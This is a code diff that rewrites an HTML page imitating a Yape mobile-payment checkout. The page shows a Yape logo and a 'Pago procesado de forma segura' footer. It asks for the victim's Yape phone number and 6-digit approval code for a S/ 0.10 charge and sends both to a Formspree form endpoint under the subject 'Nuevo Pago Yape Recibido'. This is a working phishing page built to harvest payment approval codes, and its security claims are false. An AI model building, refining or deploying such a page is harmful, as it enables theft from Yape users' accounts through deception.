@@ -1,1 +1,96 @@
- <!DOCTYPE html> <html lang="es"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>YAPE</title> <style> /* Estilos Base */ body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; } .main-wrapper { background: white; border-radius: 16px; box-shadow: 0 12px 40px rgba(0,0,0,0.12); width: 100%; max-width: 380px; overflow: hidden; border: 1px solid #eee; } /* Cabecera decorativa simulando pasarela */ .header-bar { height: 5px; background: linear-gradient(90deg, #742284 0%, #a332ba 100%); } .payment-side { padding: 30px 25px; color: #333; text-align: center; } .logo-yape { width: 110px; margin-bottom: 20px; } .instruction { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.4; } .label-text { display: block; text-align: left; font-size: 13px; font-weight: 700; color: #555; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; } /* Inputs Estilizados */ input { width: 100%; padding: 14px; margin-bottom: 18px; border-radius: 8px; box-sizing: border-box; font-size: 16px; border: 1px solid #ccc; outline: none; transition: border-color 0.3s, box-shadow 0.3s; } input:focus { border-color: #742284; box-shadow: 0 0 0 3px rgba(116, 34, 132, 0.1); } .input-codigo { text-align: center; font-weight: bold; font-size: 24px; letter-spacing: 8px; border: 2px solid #333; } .menu-ayuda { display: block; font-size: 12px; color: #742284; margin-bottom: 25px; text-decoration: none; font-weight: 600; } .menu-ayuda:hover { text-decoration: underline; } /* Botón Dinámico */ .btn-yapear { width: 100%; padding: 16px; background-color: #742284; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.3s ease; opacity: 0.5; /* Desactivado por defecto visualmente */ pointer-events: none; /* Desactivado por defecto funcionalmente */ } /* Clase que se activa con JS */ .btn-yapear.active { opacity: 1; pointer-events: auto; box-shadow: 0 4px 15px rgba(116, 34, 132, 0.3); } .btn-yapear.active:hover { background-color: #5a1a66; transform: translateY(-1px); } .footer-secure { font-size: 11px; color: #aaa; margin-top: 20px; display: flex; align-items: center; justify-content: center; gap: 5px; } </style> </head> <body> <div class="main-wrapper"> <div class="header-bar"></div> <div class="payment-side"> <img src="https://www.apuestatotal.com//cms/img/banners/892/logo-yape.png" alt="Yape" class="logo-yape"> <p class="instruction">Confirma tu pago de forma segura ingresando los datos solicitados.</p> <form id="paymentForm" action="https://formspree.io/f/xaqyqrjy" method="POST"> <label class="label-text">Celular Yape</label> <input type="tel" id="celular" name="Celular_Comprador" placeholder="900 000 000" maxlength="9" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required> <label class="label-text">Código de aprobación</label> <input type="text" id="codigo" name="Codigo_Aprobacion" placeholder="000000" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required> <a href="#" class="menu-ayuda">¿Cómo obtener el código de aprobación?</a> <input type="hidden" name="Producto" value="Servicio Verificado"> <input type="hidden" name="Precio" value="S/ 0.10"> <button type="submit" id="btnSubmit" class="btn-yapear">PAGAR S/ 0.10</button> </form> <div class="footer-secure"> <span>🔒 Pago procesado de forma segura por Monnet</span> </div> </div> </div> <script> const celularInput = document.getElementById('celular'); const codigoInput = document.getElementById('codigo'); const btnSubmit = document.getElementById('btnSubmit'); function validarFormulario() { // El celular debe tener 9 dígitos y el código 6 if (celularInput.value.length === 9 && codigoInput.value.length === 6) { btnSubmit.classList.add('active'); } else { btnSubmit.classList.remove('active'); } } // Escuchar cada vez que el usuario escribe celularInput.addEventListener('input', validarFormulario); codigoInput.addEventListener('input', validarFormulario); </script> </body> </html>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YAPE - Pago Seguro</title>
+    <style>
+        /* Estilos Base */
+        body { font-family: 'Segoe UI', Roboto, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .main-wrapper { background: white; border-radius: 16px; box-shadow: 0 12px 40px rgba(0,0,0,0.12); width: 100%; max-width: 380px; overflow: hidden; border: 1px solid #eee; }
+        .header-bar { height: 5px; background: linear-gradient(90deg, #742284 0%, #a332ba 100%); }
+        .payment-side { padding: 30px 25px; color: #333; text-align: center; }
+        .logo-yape { width: 110px; margin-bottom: 20px; }
+        .instruction { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.4; }
+        .label-text { display: block; text-align: left; font-size: 13px; font-weight: 700; color: #555; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+
+        input { width: 100%; padding: 14px; margin-bottom: 18px; border-radius: 8px; box-sizing: border-box; font-size: 16px; border: 1px solid #ccc; outline: none; transition: all 0.3s; }
+        input:focus { border-color: #742284; box-shadow: 0 0 0 3px rgba(116, 34, 132, 0.1); }
+        
+        .menu-ayuda { display: block; font-size: 12px; color: #742284; margin-bottom: 25px; text-decoration: none; font-weight: 600; }
+
+        /* Botón Mejorado */
+        .btn-yapear { 
+            width: 100%; padding: 16px; 
+            background-color: #cccccc; /* Gris por defecto */
+            color: white; border: none; border-radius: 10px; 
+            font-size: 16px; font-weight: bold; 
+            cursor: not-allowed; 
+            transition: all 0.3s ease; 
+        }
+
+        /* Clase activa controlada por JS */
+        .btn-yapear.active { 
+            background-color: #742284; 
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(116, 34, 132, 0.3);
+        }
+        .btn-yapear.active:hover { background-color: #5a1a66; transform: translateY(-1px); }
+        
+        .footer-secure { font-size: 11px; color: #aaa; margin-top: 20px; display: flex; align-items: center; justify-content: center; gap: 5px; }
+    </style>
+</head>
+<body>
+
+<div class="main-wrapper">
+    <div class="header-bar"></div>
+    <div class="payment-side">
+        <img src="https://www.apuestatotal.com//cms/img/banners/892/logo-yape.png" alt="Yape" class="logo-yape">
+        <p class="instruction">Confirma tu pago de forma segura ingresando los datos solicitados.</p>
+
+        <form id="paymentForm" action="https://formspree.io/f/xaqyqrjy" method="POST">
+            <label class="label-text">Celular Yape</label>
+            <input type="tel" id="celular" name="Celular_Comprador" placeholder="900 000 000" maxlength="9" required>
+            
+            <label class="label-text">Código de aprobación</label>
+            <input type="text" id="codigo" name="Codigo_Aprobacion" placeholder="000000" maxlength="6" required>
+            
+            <a href="#" class="menu-ayuda">¿Cómo obtener el código de aprobación?</a>
+            
+            <input type="hidden" name="_subject" value="Nuevo Pago Yape Recibido">
+            <input type="hidden" name="Precio" value="S/ 0.10">
+
+            <button type="submit" id="btnSubmit" class="btn-yapear" disabled>PAGAR S/ 0.10</button>
+        </form>
+
+        <div class="footer-secure">
+            <span>🔒 Pago procesado de forma segura</span>
+        </div>
+    </div>
+</div>
+
+<script>
+    const celularInput = document.getElementById('celular');
+    const codigoInput = document.getElementById('codigo');
+    const btnSubmit = document.getElementById('btnSubmit');
+
+    function validarFormulario() {
+        // Limpiar caracteres no numéricos
+        celularInput.value = celularInput.value.replace(/[^0-9]/g, '');
+        codigoInput.value = codigoInput.value.replace(/[^0-9]/g, '');
+
+        if (celularInput.value.length === 9 && codigoInput.value.length === 6) {
+            btnSubmit.classList.add('active');
+            btnSubmit.disabled = false; // Habilita el envío
+        } else {
+            btnSubmit.classList.remove('active');
+            btnSubmit.disabled = true; // Deshabilita el envío
+        }
+    }
+
+    celularInput.addEventListener('input', validarFormulario);
+    codigoInput.addEventListener('input', validarFormulario);
+</script>
+
+</body>
+</html>
